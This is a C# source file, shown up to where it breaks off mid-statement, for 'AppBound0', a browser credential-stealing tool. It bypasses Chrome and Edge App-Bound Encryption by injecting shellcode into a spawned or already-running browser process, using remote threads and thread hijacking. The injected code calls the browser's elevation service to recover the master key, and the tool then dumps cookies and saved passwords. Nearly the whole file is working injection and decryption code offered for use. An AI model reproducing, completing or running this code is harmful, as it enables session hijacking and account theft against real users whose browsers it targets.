// AppBound0.cs: Chrome/Edge App-Bound Encryption. Full-chain execute-assembly.
//
//   AppBound0.exe key                    [chrome|edge]        base64 master key
//   AppBound0.exe cookies                [chrome|edge] [profile] [--verify]
//   AppBound0.exe passwords              [chrome|edge] [profile] [--verify]
//   AppBound0.exe all                    [chrome|edge] [--verify]
//
// --verify: decrypt everything, print counts and GCM tag verdicts only. No
// values. Output is JSON (one object per line) on stdout.
//
// Chain per browser:
//   Local State -> app_bound_encrypted_key -> strip "APPB" (M157: no user
//   layer, the elevator unwraps its own SYSTEM-DPAPI blob) -> spawn genuine
//   browser (running, never suspended) or attach to the live Edge -> inject
//   PIC stub (AppBound0Stub.cs, zero imports) -> stub calls IElevator(2)
//   ::DecryptData from inside the trusted process -> 32-byte AES-256-GCM
//   master key lands in a section -> spawned instance terminated. No admin.
//   Real browser session untouched.
//
// Cookie/password crypto: v20 = "v20" + 32B metadata + nonce(12) + ct + tag(16)
// under the ABE key; v10 = "v10" + nonce(12) + ct + tag(16) under the legacy
// DPAPI key (os_crypt.encrypted_key). GCM tag is the correctness oracle.

using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Abe
{
    internal static class Dump
    {
        // ------------------------------------------------------------------
        // structures
        [StructLayout(LayoutKind.Sequential, Pack = 8)]
        internal struct StubParams
        {
            public Guid clsid;                 // 0x00
            public Guid iid;                   // 0x10
            public uint slot;                  // 0x20
            public uint blobLen;               // 0x24
            public ulong pCoInitializeEx;      // 0x28
            public ulong pCoCreateInstance;    // 0x30
            public ulong pSysAllocStringByteLen; // 0x38
            public ulong pSysStringByteLen;    // 0x40
            public ulong pSysFreeString;       // 0x48
            public ulong pSleep;               // 0x50
            public ulong pCoSetProxyBlanket;   // 0x58
            public ulong blob;                 // 0x60
            public ulong outSection;           // 0x68
            public ulong candidates;           // 0x70
            public uint ncand;                 // 0x78
            public uint pad;                   // 0x7c
        }

        [StructLayout(LayoutKind.Sequential, Pack = 8)]
        internal struct Candidate
        {
            public Guid clsid;
            public Guid iid;
            public uint slot;
            public uint flags;   // bit 0 = force MTA apartment (abe_common.h ABE_CAND_APT_MTA)
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB { public uint cbData; public IntPtr pbData; }

        [StructLayout(LayoutKind.Sequential, Pack = 8)]
        private struct AUTH_INFO
        {
            public uint cbSize;         // Marshal.SizeOf(AUTH_INFO). Per SDK, cbSize is FIRST
            public uint dwInfoVersion;  // 1
            public IntPtr pbNonce;
            public uint cbNonce;
            public IntPtr pbAuthData;
            public uint cbAuthData;
            public IntPtr pbTag;
            public uint cbTag;
            public IntPtr pbMacContext;
            public uint cbMacContext;
            public uint cbAAD;
            public ulong cbData;
            public uint dwFlags;
        }

        // ------------------------------------------------------------------
        // P/Invoke
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessW(string app, string cmd,
            IntPtr pa, IntPtr ta, bool ih, uint flags, IntPtr env, IntPtr cwd,
            ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateFileW(string name, uint access,
            uint share, ref SECURITY_ATTRIBUTES sa, uint disp, uint flags,
            IntPtr tmpl);
        [StructLayout(LayoutKind.Sequential)]
        internal struct SECURITY_ATTRIBUTES
        {
            public uint length; public IntPtr securityDescriptor; public bool inherit;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct STARTUPINFO
        {
            public uint cb; public IntPtr lpReserved, lpDesktop, lpTitle;
            public uint x, y, cx, cy, fill, flags, sw, sh, xCount, yCount;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread; public int pid, tid;
        }

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr,
            IntPtr size, uint type, uint protect);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr h, IntPtr baseAddr,
            byte[] buf, IntPtr size, out IntPtr written);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr h, IntPtr baseAddr,
            IntPtr buf, IntPtr size, out IntPtr written);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool VirtualProtectEx(IntPtr h, IntPtr addr,
            IntPtr size, uint newProt, out uint oldProt);
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr attr,
            IntPtr stack, IntPtr start, IntPtr param, uint flags, out uint tid);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool TerminateThread(IntPtr h, uint code);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr h, uint code);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool GetExitCodeProcess(IntPtr h, out uint code);
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint pid);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool Thread32First(IntPtr snap, ref THREADENTRY32 te);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool Thread32Next(IntPtr snap, ref THREADENTRY32 te);
        [DllImport("kernel32", SetLastError = true)]
        private static extern uint SuspendThread(IntPtr h);
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct THREADENTRY32
        {
            public uint dwSize, cntUsage, th32ThreadID, th32OwnerProcessID;
            public int tpBasePri, tpDeltaPri, dwFlags;
        }

        private const uint CONTEXT_CONTROL = 0x100001;
        private const int SIZE_OF_X64_CONTEXT = 1232;
        // winnt.h x64 CONTEXT field offsets
        private const int CTXOFF_ContextFlags = 0x30;
        private const int CTXOFF_Rcx = 0x80;
        private const int CTXOFF_Rip = 0xF8;

        [DllImport("kernel32", SetLastError = true)]
        private static extern int GetThreadContext(IntPtr h, IntPtr ctx);
        [DllImport("kernel32", SetLastError = true)]
        private static extern int SetThreadContext(IntPtr h, IntPtr ctx);
        [DllImport("kernel32", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr h);
        [DllImport("kernel32")] private static extern bool CloseHandle(IntPtr h);

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr CreateFileMappingW(IntPtr hFile,
            IntPtr attrs, uint protect, uint maxHi, uint maxLo, string name);
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr MapViewOfFile(IntPtr h, uint access,
            uint offHi, uint offLo, IntPtr size);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool UnmapViewOfFile(IntPtr addr);

        [DllImport("ntdll")]
        private static extern int NtMapViewOfSection(IntPtr section,
            IntPtr process, ref IntPtr baseAddr, UIntPtr zeroBits,
            UIntPtr commitSize, IntPtr sectionOffset, ref UIntPtr viewSize,
            int inherit, uint allocType, uint protect);

        [DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int RegGetValueW(UIntPtr hkey, string sub,
            string value, uint flags, IntPtr type, byte[] data, ref uint cb);
        [DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int RegGetValueW(UIntPtr hkey, string sub,
            string value, uint flags, IntPtr type, IntPtr data, ref uint cb);
        private static readonly UIntPtr HKLM = new UIntPtr(0x80000002u);
        private static readonly UIntPtr HKCU = new UIntPtr(0x80000001u);

        [DllImport("crypt32", SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DATA_BLOB inb,
            IntPtr descr, IntPtr entropy, IntPtr reserved, IntPtr prompt,
            uint flags, out DATA_BLOB outb);
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LocalFree(IntPtr p);

        [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr GetModuleHandleW(string name);
        [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr LoadLibraryW(string name);
        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr h, string name);

        [DllImport("kernel32")] private static extern void CopyMemory(IntPtr dst, IntPtr src, IntPtr cb);

        // bcrypt
        [DllImport("bcrypt", CharSet = CharSet.Unicode)]
        private static extern int BCryptOpenAlgorithmProvider(out IntPtr alg,
            string algId, string impl, uint flags);
        [DllImport("bcrypt", CharSet = CharSet.Unicode)]
        private static extern int BCryptSetProperty(IntPtr obj, string prop,
            string val, int size, int flags);
        [DllImport("bcrypt")]
        private static extern int BCryptGenerateSymmetricKey(IntPtr alg,
            out IntPtr key, IntPtr pbKeyObject, int cbKeyObject, byte[] secret,
            int cbSecret, int flags);
        [DllImport("bcrypt")]
        private static extern int BCryptDecrypt(IntPtr key, byte[] input,
            int cbInput, ref AUTH_INFO padding, IntPtr iv, int cbIv,
            byte[] output, int cbOutput, out int cbResult, int flags);
        [DllImport("bcrypt", CharSet = CharSet.Unicode)]
        private static extern int BCryptGetProperty(IntPtr obj, string prop,
            byte[] value, int cbValue, out int cbResult, int flags);
        [DllImport("bcrypt")]
        private static extern int BCryptDestroyKey(IntPtr key);
        [DllImport("bcrypt")]
        private static extern int BCryptCloseAlgorithmProvider(IntPtr alg, int flags);

        // ------------------------------------------------------------------
        // elevator constants (Chrome M157 source + registry cross-check)
        private static readonly Guid CLSID_CHROME =
            new Guid(0x708860E0, 0xF641, 0x4611, 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B);
        private static readonly Guid IID_ELEV2_CHROME =
            new Guid(0x1BF5208B, 0x295F, 0x4992, 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38);
        private static readonly Guid IID_ELEV_CHROME =
            new Guid(0x463ABECF, 0x410D, 0x407F, 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8);
        private static readonly Guid IID_ELEV2_BASE =
            new Guid(0x8F7B6792, 0x784D, 0x4047, 0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05);
        private static readonly Guid IID_ELEV_BASE =
            new Guid(0xA949CB4E, 0xC4F9, 0x44C4, 0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C);
        private static readonly Guid CLSID_EDGE =
            new Guid(0x1FCBE96C, 0x1697, 0x43AF, 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67);
        // Edge 158 stable elevator alias: the 158 service object QIs
        // E_NOINTERFACE for the old {C9C2B807} alias.
        private static readonly Guid IID_EDGE3_STABLE =
            new Guid(0x12B23868, 0x6DCD, 0x4D1A, 0xAD, 0x4C, 0x65, 0xB0, 0x28, 0x52, 0x01, 0xFC);
        private static readonly Guid IID_EDGE_FINAL =
            new Guid(0xC9C2B807, 0x7731, 0x4F34, 0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B);
        private static readonly Guid IID_EDGE_COPILOT =
            new Guid(0x17DF149F, 0xBE61, 0x447E, 0xA3, 0x05, 0x52, 0x2F, 0x55, 0x02, 0x1B, 0x36);

        private const uint SLOT_STD = 5;   // IElevator/IElevator2 vtable
        private const uint SLOT_EDGE = 8;  // Edge final flavor (3-method prefix)
        private const uint CAND_MTA = 1;   // Candidate.flags bit 0: force MTA apartment

        private static Candidate[] Chain(bool edge)
        {
            if (!edge)
                return new[] {
                    new Candidate { clsid = CLSID_CHROME, iid = IID_ELEV2_CHROME, slot = SLOT_STD },
                    new Candidate { clsid = CLSID_CHROME, iid = IID_ELEV_CHROME,  slot = SLOT_STD },
                    new Candidate { clsid = CLSID_CHROME, iid = IID_ELEV2_BASE,   slot = SLOT_STD },
                    new Candidate { clsid = CLSID_CHROME, iid = IID_ELEV_BASE,    slot = SLOT_STD },
                };
            // Edge 158.0.4370.33: slot 8 is DecryptData on IElevator
            // (IElevatorEdgeBase 3-5, IElevator 6-8, IElevator2 9-10,
            // IElevator3 11-12). The service only answers the IElevator3Edge
            // alias {12B23868}, which leads the chain. MTA first; STA as
            // fallbacks.
            return new[] {
                new Candidate { clsid = CLSID_EDGE, iid = IID_EDGE3_STABLE, slot = SLOT_EDGE, flags = CAND_MTA },
                new Candidate { clsid = CLSID_EDGE, iid = IID_EDGE_FINAL,   slot = SLOT_EDGE, flags = CAND_MTA },
                new Candidate { clsid = CLSID_EDGE, iid = IID_EDGE3_STABLE, slot = SLOT_EDGE },
                new Candidate { clsid = CLSID_EDGE, iid = IID_EDGE_FINAL,   slot = SLOT_EDGE },
                new Candidate { clsid = CLSID_EDGE, iid = IID_ELEV_BASE,    slot = SLOT_EDGE, flags = CAND_MTA },
            };
        }

        // ------------------------------------------------------------------
        // main
        private static void Banner()
        {
            Console.WriteLine();
            Console.WriteLine("    ___                ____                        ______ ");
            Console.WriteLine("   /   |  ____  ____  / __ )____  __  ______  ____/ / __ \\");
            Console.WriteLine("  / /| | / __ \\/ __ \\/ __  / __ \\/ / / / __ \\/ __  / / / /");
            Console.WriteLine(" / ___ |/ /_/ / /_/ / /_/ / /_/ / /_/ / / / / /_/ / /_/ / ");
            Console.WriteLine("/_/  |_/ .___/ .___/_____/\\____/\\__,_/_/ /_/\\__,_/\\____/  ");
            Console.WriteLine("      /_/   /_/                                           ");
            Console.WriteLine();
            WriteLineC("  AppBound0 v1.0 - Chrome/Edge ABE key + cookie extraction",
                ConsoleColor.Cyan, false, true);
            WriteLineC("  by Rabbitbong", ConsoleColor.Magenta, false, true);
            Console.WriteLine();
        }

        private static void Usage()
        {
            Console.WriteLine("  usage: AppBound0.exe <verb> [chrome|edge] [profile] [options]");
            Console.WriteLine();
            WriteLineC("  verbs:", ConsoleColor.Yellow, false, true);
            Console.WriteLine("    key                     extract + print base64 master key");
            Console.WriteLine("    keyfile <path>          extract + write raw 32-byte key to file");
            Console.WriteLine("    cookies [profile]       dump cookies (readable table)");
            Console.WriteLine("    passwords [profile]     dump saved passwords (readable table)");
            Console.WriteLine("    all                     cookies + passwords");
            Console.WriteLine();
            WriteLineC("  options:", ConsoleColor.Yellow, false, true);
            Console.WriteLine("    --verify                GCM-tag check only, no values printed");
            Console.WriteLine("    --json                  machine-readable JSON lines instead of table");
            Console.WriteLine("    --keyfile <path>        use cached key instead of live extraction");
            Console.WriteLine();
            Console.WriteLine("  browsers: chrome (default) | edge");
            Console.WriteLine("  edge: requires a running msedge.exe (attaches to it)");
            Console.WriteLine("  chrome: spawns its own headless instance (throwaway profile)");
            Console.WriteLine();
        }

        private static int Main(string[] args)
        {
            if (Marshal.SizeOf(typeof(StubParams)) != 0x80)
            { Console.Error.WriteLine("layout drift: StubParams != 0x80"); return 2; }

            // bare run = help only, never an accidental extraction
            if (args.Length == 0 || args[0] == "-h" || args[0] == "--help"
                || args[0] == "/?")
            {
                Banner();
                Usage();
                return 0;
            }

            string verb = args[0].ToLowerInvariant();
            bool edge = false, verify = false, json = false;
            string profile = null, keyFile = null;
            for (int i = 1; i < args.Length; i++)
            {
                var a = args[i].ToLowerInvariant();
                if (a == "edge") edge = true;
                else if (a == "chrome") edge = false;
                else if (a == "--verify") verify = true;
                else if (a == "--json") json = true;
                else if (a == "--keyfile") { keyFile = args[i + 1]; i++; }
                else profile = args[i];
            }
            if (keyFile != null && !File.Exists(keyFile))
            {
                Console.Error.WriteLine("abe: keyfile not found: " + keyFile);
                return 2;
            }

            try
            {
                switch (verb)
                {
                    case "key":
                        {
                            var key = ExtractKey(edge, null);
                            if (key == null) return 1;
                            Console.WriteLine(Convert.ToBase64String(key));
                            return 0;
                        }
                    case "keyfile":
                        {
                            var key = ExtractKey(edge, null);
                            if (key == null) return 1;
                            string outp = profile != null ? profile : "abe.key";
                            File.WriteAllBytes(outp, key);
                            WriteLineC("written " + outp + " (" + key.Length + " bytes)", ConsoleColor.Green, false, true);
                            return 0;
                        }
                    case "cookies":
                        return DumpCookies(edge, profile, verify, keyFile, json);
                    case "passwords":
                        return DumpPasswords(edge, profile, verify, keyFile, json);
                    case "all":
                        {
                            int rc = DumpCookies(edge, profile, verify, keyFile, json);
                            rc |= DumpPasswords(edge, profile, verify, keyFile, json);
                            return rc;
                        }
                    default:
                        Console.Error.WriteLine("unknown verb: " + verb);
                        Usage();
                        return 2;
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("abe: " + e.ToString());
                return 3;
            }
        }

        // ------------------------------------------------------------------
        // paths + Local State
        internal static string UserDataDirPublic(bool edge) { return UserDataDir(edge); }

        internal static void GetExitCodeProcessPublic(IntPtr h, out uint code)
        { GetExitCodeProcess(h, out code); }

        private static string UserDataDir(bool edge)
        {
            string lad = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            return Path.Combine(lad, edge
                ? @"Microsoft\Edge\User Data"
                : @"Google\Chrome\User Data");
        }

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool Process32FirstW(IntPtr snap, ref PROCESSENTRY32W pe);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool Process32NextW(IntPtr snap, ref PROCESSENTRY32W pe);
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct PROCESSENTRY32W
        {
            public uint dwSize, cntUsage, th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID, cntThreads, th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string strExeFile;
        }

        // diagnostics for the attach target (set by FindRunningBrowser)
        private static uint lastAttachPid;
        private static string lastAttachCmd = "";

        // find the MAIN browser process. Chromium launches every child
        // (renderer, gpu, utility, crashpad-handler) with --type= on its
        // command line; the main browser never carries it. The previous
        // parent-image heuristic alone mis-picked in post-update trees
        // (crashpad handlers whose spawner exited, relaunched mains whose
        // parent was the previous main), and a wrong pick injects into a
        // process whose COM state faults. Cmdlines come from the PEB
        // (ReadCmdline); other-user processes fail the PEB read and are
        // skipped, so only same-user candidates survive. Toolhelp
        // enumeration is creation order: oldest qualifying process first.
        private static IntPtr FindRunningBrowser(bool edge)
        {
            string img = edge ? "msedge.exe" : "chrome.exe";
            IntPtr snap = CreateToolhelp32Snapshot(0x2, 0);
            if (snap == IntPtr.Zero || snap == (IntPtr)(-1)) return IntPtr.Zero;
            var pe = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32W)) };
            var cands = new System.Collections.Generic.List<uint>();
            bool ok = Process32FirstW(snap, ref pe);
            while (ok)
            {
                if (pe.strExeFile == img)
                {
                    string cl = ReadCmdline((int)pe.th32ProcessID);
                    if (cl != null &&
                        cl.IndexOf("--type=", StringComparison.OrdinalIgnoreCase) < 0)
                        cands.Add(pe.th32ProcessID);
                }
                ok = Process32NextW(snap, ref pe);
            }
            CloseHandle(snap);

            foreach (uint pid in cands)
            {
                IntPtr h = OpenProcess(0x1F0FFF /* full */, false, pid);
                if (h != IntPtr.Zero)
                {
                    // checked open: a candidate that refuses access no longer
                    // silently flips Edge into the (faulting) spawn path
                    lastAttachPid = pid;
                    string cl = ReadCmdline((int)pid);
                    lastAttachCmd = (cl == null) ? "" :
                        (cl.Length > 90 ? cl.Substring(0, 90) : cl);
                    return h;
                }
            }
            return IntPtr.Zero;
        }

        private static byte[] ExtractKey(bool edge, List<string> log)
        {
            string localState = Path.Combine(UserDataDir(edge), "Local State");
            if (!File.Exists(localState))
            {
                Console.Error.WriteLine("abe: Local State not found: " + localState);
                return null;
            }
            string json = File.ReadAllText(localState);
            string b64 = ExtractJsonValue(json, "app_bound_encrypted_key");
            if (b64 == null)
            {
                Console.Error.WriteLine("abe: app_bound_encrypted_key missing");
                return null;
            }
            byte[] wrapped = Convert.FromBase64String(b64);
            if (wrapped.Length < 36 || wrapped[0] != 'A' || wrapped[1] != 'P' ||
                wrapped[2] != 'P' || wrapped[3] != 'B')
            {
                Console.Error.WriteLine("abe: APPB magic missing");
                return null;
            }
            // M157 os_crypt_async format: post-APPB bytes go STRAIGHT to
            // DecryptData: the SYSTEM-DPAPI layer lives inside the service
            // (source: RetrieveEncryptedKey + DecryptAppBoundString,
            // chrome/browser/os_crypt/, M157). No user-DPAPI wrapper.
            var blob = new byte[wrapped.Length - 4];
            Array.Copy(wrapped, 4, blob, 0, blob.Length);
            if (log != null) log.Add(string.Format(
                "app-bound material: {0} bytes (post-APPB)", blob.Length));

            // Edge: COM injection faults in a FRESH headless spawn (combase
            // not yet initialized), but works in the user's RUNNING browser
            // (fully-initialized COM; xaitax-proven flow). ElevatorDecrypt
            // attaches to the live browser for Edge, spawns headless Chrome.
            // HWBP path kept in AbeHwbp.cs as fallback/experiment.
            var key = ElevatorDecrypt(edge, blob, log);
            return key;
        }

        private static string ExtractJsonValue(string json, string key)
        {
            string needle = "\"" + key + "\"";
            int at = json.IndexOf(needle, StringComparison.OrdinalIgnoreCase);
            if (at < 0) return null;
            int colon = json.IndexOf(':', at + needle.Length);
            if (colon < 0) return null;
            int q1 = json.IndexOf('"', colon);
            if (q1 < 0) return null;
            int q2 = json.IndexOf('"', q1 + 1);
            if (q2 < 0) return null;
            return json.Substring(q1 + 1, q2 - q1 - 1);
        }

        private static byte[] DPapiUnwrap(byte[] blob, int offset)
        {
            var pin = new DATA_BLOB
            {
                cbData = (uint)(blob.Length - offset),
                pbData = Marshal.AllocHGlobal(blob.Length - offset)
            };
            Marshal.Copy(blob, offset, pin.pbData, blob.Length - offset);
            DATA_BLOB pout;
            bool ok = CryptUnprotectData(ref pin, IntPtr.Zero, IntPtr.Zero,
                IntPtr.Zero, IntPtr.Zero, 0, out pout);
            Marshal.FreeHGlobal(pin.pbData);
            if (!ok || pout.pbData == IntPtr.Zero) return null;
            var ret = new byte[pout.cbData];
            Marshal.Copy(pout.pbData, ret, 0, (int)pout.cbData);
            LocalFree(pout.pbData);
            return ret;
        }

        private static byte[] LegacyKey(string localStateJson)
        {
            string b64 = ExtractJsonValue(localStateJson, "encrypted_key");
            if (b64 == null) return null;
            byte[] raw = Convert.FromBase64String(b64);
            if (raw.Length < 5) return null;
            // "DPAPI" prefix
            return DPapiUnwrap(raw, 5);
        }

        // ------------------------------------------------------------------
        // the bypass: genuine browser process + PIC stub + COM inside it
        private static byte[] ElevatorDecrypt(bool edge, byte[] blob, List<string> log)
        {
            // EDGE: a fresh headless spawn faults inside combase (CoInit and
            // CoCreateInstance both 0xC0000005 in the young process). The
            // proven Edge flow (xaitax: inject into real msedge.exe) uses the
            // user's RUNNING browser. Its COM is fully initialized and the
            // elevation service sees a genuine msedge.exe caller. Chrome keeps
            // the headless spawn (verified working there).
            IntPtr liveBrowser = edge ? FindRunningBrowser(edge) : IntPtr.Zero;
            if (edge && liveBrowser == IntPtr.Zero)
            {
                // Edge is attach-only: a fresh headless Edge faults inside
                // combase the moment a remote thread drives COM, so spawning
                // for Edge would just crash. Fail loudly instead.
                Console.Error.WriteLine(
                    "abe: no running msedge.exe main browser found (edge is attach-only; spawn disabled)");
                return null;
            }
            string exe = ResolveExe(edge);
            if (exe == null)
            {
                Console.Error.WriteLine("abe: browser exe not found");
                return null;
            }

            IntPtr section = CreateFileMappingW(new IntPtr(-1), IntPtr.Zero,
                0x04 /* PAGE_READWRITE */, 0, 4096, null);
            if (section == IntPtr.Zero)
            { Console.Error.WriteLine("abe: CreateFileMapping failed"); return null; }
            IntPtr view = MapViewOfFile(section, 0x000F001F /* FILE_MAP_ALL_ACCESS */,
                0, 0, (IntPtr)4096);
            if (view == IntPtr.Zero)
            { Console.Error.WriteLine("abe: MapViewOfFile failed"); CloseHandle(section); return null; }
            ZeroMem(view, 4096);

            // Headless + throwaway profile: no window, no singleton handoff,
            // and the elevation service validates only the image path while
            // the app-bound blob is self-contained.
            // EDGE: remote threads (any apartment) fault inside combase in
            // this hardened process, so Edge runs the stub via THREAD HIJACK
            // on one of Edge's own initialized threads (VoidStealer-class
            // primitive). Chrome keeps the plain remote thread.
            var si = new STARTUPINFO(); si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;
            bool spawned = false;
            bool attachMode = liveBrowser != IntPtr.Zero;
            if (attachMode)
            {
                // attach mode: inject into the user's running browser. NO
                // termination at cleanup, so the user's session stays intact.
                Status("[*] attaching to running browser pid " + lastAttachPid +
                    (lastAttachCmd.Length > 0 ? " [" + lastAttachCmd + "]" : ""));
                pi = new PROCESS_INFORMATION
                {
                    hProcess = liveBrowser,
                    hThread = IntPtr.Zero,
                    pid = 0,
                    tid = 0
                };
            }
            else
            {
                if (Environment.GetEnvironmentVariable("ABE_NOJANITOR") == null) JanitorSweep(exe);
                string tempDir = Path.Combine(Path.GetTempPath(),
                    "abe_" + Guid.NewGuid().ToString("N").Substring(0, 10));
                // Chromium re-parses GetCommandLineW: the spaced exe path MUST be quoted
                // or Edge self-terminates with exit 13 (mangled argv)
                string cmdArgs = "\"" + exe + "\" --headless=new --disable-gpu" +
                    " --disable-direct-composition --log-level=3 --no-first-run" +
                    " --no-default-browser-check --no-sandbox --user-data-dir=\"" + tempDir + "\"";
                // redirect the child's stdout/stderr to NUL: the headless
                // instance's GPU probe spam would otherwise inherit our
                // console (CREATE_NO_WINDOW alone doesn't stop it; the
                // child writes to the console it inherits via the handles)
                var sa = new SECURITY_ATTRIBUTES { length = 8, inherit = true };
                IntPtr hNul = Environment.GetEnvironmentVariable("ABE_NOREDIR") != null
                    ? IntPtr.Zero
                    : CreateFileW("NUL", (uint)0x40000000 /*GENERIC_WRITE*/,
                    0x2 /*FILE_SHARE_WRITE*/, ref sa, 3 /*OPEN_EXISTING*/, 0, IntPtr.Zero);
                if (hNul != IntPtr.Zero && hNul != new IntPtr(-1))
                {
                    si.flags = 0x100 /*STARTF_USESTDHANDLES*/;
                    si.hStdInput = IntPtr.Zero;
                    si.hStdOutput = hNul;
                    si.hStdError = hNul;
                }
                if (!CreateProcessW(exe, cmdArgs, IntPtr.Zero, IntPtr.Zero,
                        hNul != IntPtr.Zero && hNul != new IntPtr(-1),
                        0x08000000 /* CREATE_NO_WINDOW */, IntPtr.Zero, IntPtr.Zero,
                        ref si, out pi))
                {
                    Console.Error.WriteLine("abe: CreateProcess failed GLE=" +
                        Marshal.GetLastWin32Error());
                    if (hNul != IntPtr.Zero && hNul != new IntPtr(-1)) CloseHandle(hNul);
                    UnmapViewOfFile(view); CloseHandle(section);
                    return null;
                }
                if (hNul != IntPtr.Zero && hNul != new IntPtr(-1)) CloseHandle(hNul);
                spawned = true;
            }
            System.Threading.Thread.Sleep(1500); // headless init; no window
            {
                uint spawnState;
                GetExitCodeProcess(pi.hProcess, out spawnState);
                if (spawnState != 0x103 /* STILL_ACTIVE */)
                {
                    Console.Error.WriteLine("abe: spawned browser exited early st=0x" +
                        spawnState.ToString("x8"));
                    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
                    UnmapViewOfFile(view); CloseHandle(section);
                    return null;
                }
            }

            byte[] stubBlob = AppBound0Stub.Blob;
            var chain = Chain(edge);
            byte[] chainBytes = new byte[chain.Length * AppBound0Stub.CandidateSize];
            for (int i = 0; i < chain.Length; i++)
            {
                IntPtr p = Marshal.AllocHGlobal(AppBound0Stub.CandidateSize);
                Marshal.StructureToPtr(chain[i], p, false);
                Marshal.Copy(p, chainBytes, i * AppBound0Stub.CandidateSize, AppBound0Stub.CandidateSize);
                Marshal.FreeHGlobal(p);
            }

            int codeTotal = stubBlob.Length + 32; // stub + hijack trampoline
            IntPtr code = VirtualAllocEx(pi.hProcess, IntPtr.Zero,
                (IntPtr)codeTotal, 0x3000 /* COMMIT|RESERVE */, 0x04 /* RW */);
            IntPtr data = VirtualAllocEx(pi.hProcess, IntPtr.Zero,
                (IntPtr)(AppBound0Stub.ParamsSize + chainBytes.Length + blob.Length + 64),
                0x3000, 0x04);
            byte[] key = null;
            bool ok = false;
            int done_diag = 0;
            IntPtr thStub = IntPtr.Zero;
            do
            {
                if (code == IntPtr.Zero || data == IntPtr.Zero)
                {
                    uint pc;
                    GetExitCodeProcess(pi.hProcess, out pc);
                    Err("VirtualAllocEx failed GLE=" +
                        Marshal.GetLastWin32Error() +
                        " proc_exit=0x" + pc.ToString("x8"));
                    break;
                }

                IntPtr w;
                if (!WriteProcessMemory(pi.hProcess, code, stubBlob,
                        (IntPtr)stubBlob.Length, out w))
                { Err("WriteProcessMemory(code)"); break; }
                if (edge)
                {
                    // trampoline right after the stub: sets RCX then jumps in
                    byte[] tramp = new byte[20];
                    tramp[0] = 0x48; tramp[1] = 0xB9;
                    Array.Copy(BitConverter.GetBytes((long)data), 0, tramp, 2, 8);
                    tramp[10] = 0x48; tramp[11] = 0xB8;
                    Array.Copy(BitConverter.GetBytes((long)code), 0, tramp, 12, 8);
                    tramp[18] = 0xFF; tramp[19] = 0xE0;
                    if (!WriteProcessMemory(pi.hProcess, code + stubBlob.Length,
                            tramp, (IntPtr)20, out w))
                    { Err("WriteProcessMemory(trampoline)"); break; }
                }
                uint oldp;
                if (!VirtualProtectEx(pi.hProcess, code, (IntPtr)codeTotal,
                        0x20 /* PAGE_EXECUTE_READ */, out oldp))
                { Err("VirtualProtectEx"); break; }

                IntPtr cand = data + AppBound0Stub.ParamsSize;
                IntPtr blobP = cand + chainBytes.Length;
                if (!WriteProcessMemory(pi.hProcess, cand, chainBytes,
